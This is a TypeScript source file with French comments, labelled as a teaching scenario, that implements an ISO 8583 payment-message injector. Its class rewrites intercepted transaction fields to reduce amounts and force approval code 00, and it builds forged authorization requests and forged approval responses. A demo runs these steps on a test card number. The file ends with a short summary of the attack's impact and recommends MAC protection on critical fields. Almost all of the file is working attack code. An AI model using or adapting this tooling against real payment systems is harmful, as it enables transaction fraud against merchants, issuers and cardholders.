/**
 * Scénario 1 : Message Injector
 * EXPLOIT : Injection de messages ISO 8583 falsifiés
 * 
 * ⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT
 */

interface ISO8583Message {
    mti: string;
    bitmap: string;
    fields: Record<string, string>;
}

interface InjectionConfig {
    targetField: number;
    newValue: string;
    preserveMAC: boolean;
}

/**
 * Classe pour l'injection de messages falsifiés
 */
class MessageInjector {
    private interceptedMessages: ISO8583Message[] = [];
    private injectionRules: InjectionConfig[] = [];

    /**
     * Configure une règle d'injection
     */
    addInjectionRule(field: number, newValue: string, preserveMAC = false): void {
        this.injectionRules.push({
            targetField: field,
            newValue,
            preserveMAC
        });
        console.log(`[Injector] Règle ajoutée: DE${field} → ${newValue}`);
    }

    /**
     * Parse un message ISO 8583 brut
     */
    parseMessage(raw: string): ISO8583Message {
        const parts = raw.split('|');
        const fields: Record<string, string> = {};

        parts.forEach((part, index) => {
            if (index > 0) {
                fields[`DE${index + 1}`] = part;
            }
        });

        return {
            mti: parts[0] || '0100',
            bitmap: this.generateBitmap(fields),
            fields
        };
    }

    /**
     * Génère le bitmap basé sur les champs présents
     */
    private generateBitmap(fields: Record<string, string>): string {
        let bitmap = BigInt(0);
        Object.keys(fields).forEach(key => {
            const fieldNum = parseInt(key.replace('DE', ''));
            if (fieldNum >= 1 && fieldNum <= 64) {
                bitmap |= BigInt(1) << BigInt(64 - fieldNum);
            }
        });
        return bitmap.toString(16).padStart(16, '0').toUpperCase();
    }

    /**
     * Injecte les modifications selon les règles configurées
     */
    injectModifications(message: ISO8583Message): ISO8583Message {
        const modified = { ...message, fields: { ...message.fields } };

        for (const rule of this.injectionRules) {
            const fieldKey = `DE${rule.targetField}`;
            const originalValue = modified.fields[fieldKey];

            if (originalValue !== undefined) {
                console.log(`[Injector] Modification DE${rule.targetField}:`);
                console.log(`   Original: ${originalValue}`);
                console.log(`   Injecté:  ${rule.newValue}`);

                modified.fields[fieldKey] = rule.newValue;
            }
        }

        // Recalculer le bitmap
        modified.bitmap = this.generateBitmap(modified.fields);

        return modified;
    }

    /**
     * Sérialise un message pour transmission
     */
    serializeMessage(message: ISO8583Message): string {
        const parts = [message.mti];

        // Ajouter les champs dans l'ordre
        for (let i = 2; i <= 64; i++) {
            const fieldKey = `DE${i}`;
            if (message.fields[fieldKey]) {
                parts.push(message.fields[fieldKey]);
            }
        }

        return parts.join('|');
    }

    /**
     * Génère un message d'autorisation falsifié
     */
    generateFakeAuthorization(originalPAN: string, fakeAmount: string): ISO8583Message {
        return {
            mti: '0100',
            bitmap: 'F23C449128E18000',
            fields: {
                DE2: originalPAN,
                DE3: '000000',
                DE4: fakeAmount,  // Montant modifié
                DE11: this.generateSTAN(),
                DE12: this.getCurrentTime(),
                DE13: this.getCurrentDate(),
                DE41: 'FAKE0001',
                DE42: 'FAKEMERCHANT01'
            }
        };
    }

    /**
     * Génère une fausse réponse d'autorisation
     */
    generateFakeResponse(originalRequest: ISO8583Message): ISO8583Message {
        return {
            mti: '0110',
            bitmap: originalRequest.bitmap,
            fields: {
                ...originalRequest.fields,
                DE38: 'FAKE01',  // Code autorisation falsifié
                DE39: '00'       // Forcer l'approbation
            }
        };
    }

    private generateSTAN(): string {
        return Math.floor(Math.random() * 999999).toString().padStart(6, '0');
    }

    private getCurrentTime(): string {
        const now = new Date();
        return `${now.getHours().toString().padStart(2, '0')}${now.getMinutes().toString().padStart(2, '0')}${now.getSeconds().toString().padStart(2, '0')}`;
    }

    private getCurrentDate(): string {
        const now = new Date();
        return `${(now.getMonth() + 1).toString().padStart(2, '0')}${now.getDate().toString().padStart(2, '0')}`;
    }
}

/**
 * Démonstration de l'injection
 */
function demonstrateInjection(): void {
    console.log('═'.repeat(60));
    console.log('  💉 MESSAGE INJECTOR - Scénario 1');
    console.log('  ⚠️  USAGE STRICTEMENT PÉDAGOGIQUE');
    console.log('═'.repeat(60));

    const injector = new MessageInjector();

    // Configurer les règles d'injection
    console.log('\n📋 Configuration des règles d\'injection:');
    injector.addInjectionRule(4, '000001000', false);  // Réduire le montant
    injector.addInjectionRule(39, '00', false);         // Forcer l'approbation

    // Simuler un message intercepté
    const originalMessage = '0100|4111111111111111|000000|000100000|123456|';
    console.log('\n📥 Message original intercepté:');
    console.log(`   ${originalMessage}`);

    // Parser et modifier
    const parsed = injector.parseMessage(originalMessage);
    console.log('\n📊 Message parsé:');
    console.log(`   MTI: ${parsed.mti}`);
    console.log(`   Bitmap: ${parsed.bitmap}`);

    const modified = injector.injectModifications(parsed);

    console.log('\n📤 Message injecté:');
    console.log(`   ${injector.serializeMessage(modified)}`);

    // Générer une fausse autorisation
    console.log('\n\n💀 Génération d\'une fausse autorisation:');
    const fakeAuth = injector.generateFakeAuthorization('4111111111111111', '000000100');
    console.log(`   MTI: ${fakeAuth.mti}`);
    console.log(`   PAN: ****${fakeAuth.fields.DE2?.slice(-4)}`);
    console.log(`   Montant: ${parseInt(fakeAuth.fields.DE4 || '0') / 100} EUR`);

    console.log('\n' + '─'.repeat(60));
    console.log('  💡 IMPACT DE L\'ATTAQUE:');
    console.log('─'.repeat(60));
    console.log(`
  1. L'attaquant peut modifier le montant des transactions
  2. L'attaquant peut forcer l'approbation de transactions refusées
  3. L'attaquant peut injecter de fausses transactions

  ✅ SOLUTION: Implémenter un MAC sur TOUS les champs critiques
`);
    console.log('═'.repeat(60) + '\n');
}

// Exécution
demonstrateInjection();

export { MessageInjector, ISO8583Message, InjectionConfig };
